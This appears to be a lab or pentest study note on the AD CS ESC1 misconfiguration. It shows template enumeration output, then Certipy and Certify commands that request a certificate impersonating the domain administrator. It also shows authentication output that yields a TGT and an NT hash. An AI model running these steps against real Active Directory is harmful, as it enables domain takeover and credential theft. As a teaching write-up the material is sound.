
# ESC1: Enrollee-Supplied Subject for Client Authentication


The vulnerability happens when a certificate template has:

1. The certificate template allows the **enrollee to supply subject information** (The CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag is enabled.) 
2. **Client Authentication** EKU
3. **Any user** (like `Domain Users`) has **Enroll** rights.
4. No **manager approval** required

This means that Any user can **request a certificate that says they're the domain administrator** (or anyone) — and the CA will **sign it** without asking questions.

```bash
 
    Template Name                       : ESC1
    Display Name                        : ESC1
    Certificate Authorities             : LOL-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-07-17T00:15:41+00:00
    Template Last Modified              : 2025-07-17T00:15:41+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOL.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : LOL.LOCAL\Enterprise Admins
        Full Control Principals         : LOL.LOCAL\Domain Admins
                                          LOL.LOCAL\Local System
                                          LOL.LOCAL\Enterprise Admins
        Write Owner Principals          : LOL.LOCAL\Domain Admins
                                          LOL.LOCAL\Local System
                                          LOL.LOCAL\Enterprise Admins
        Write Dacl Principals           : LOL.LOCAL\Domain Admins
                                          LOL.LOCAL\Local System
                                          LOL.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : LOL.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

```

---

Exploiting an ESC1 vulnerability typically involves two main steps:
1. Requesting a certificate using the vulnerable template, injecting the identity of a privileged target(administrator).
 
```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'VulnTemplate' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
```

- `-u 'attacker@corp.local' -p 'Passw0rd!'`: Credentials of the user that can perform the request.
- `-dc-ip '10.0.0.100'`: IP address of a Domain Controller for DNS lookups if needed.
- `-target 'CA.CORP.LOCAL' -ca 'CORP-CA'`: Specifies the target CA name and its DNS/hostname.
- `-template 'VulnTemplate'`: The ESC1 vulnerable template name.
- `-upn 'administrator@corp.local'`: The UPN of the target user to be embedded in the certificate's SAN (the impersonated user).
- `-sid 'S-1-5-21-...-500'`: The SID of the target user (Administrator) to be embedded in the certificate's SID extension.

  
2. Using the obtained certificate to authenticate as that target.

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

expected output
```bash
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@lol.local'
[*]     SAN URL SID: 'S-1-5-21-1558345677-4257867870-1842270656-500'
[*] Using principal: 'administrator@lol.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@lol.local': aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42

```

> [!NOTE]
  _Note on targeting machine accounts:_ If the goal is to impersonate a machine account (e.g., a Domain Controller like `DC01$`), the `-dns` parameter should be used with the FQDN of the machine (e.g., `-dns 'dc01.corp.local'`) instead of `-upn`. This correctly populates the dNSName field in the SAN, which is typically used for machine identity. The `-sid` parameter remains the same, specifying the machine account's SID. While using `-upn` with a machine account's UPN (e.g., `DC01$@corp.local`) might sometimes work, `-dns` is the more appropriate SAN type for machine identities
  
  

---


We can request a certificate for the domain administrator.
```bash
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC1 /altname:essos\administrator /sid:S-1-5-21-1394808576-3393508183-1134699666-500
```

then convert to PFX

then Use Rubeus to either request NTLM hash directly or get a Kerberos TGT




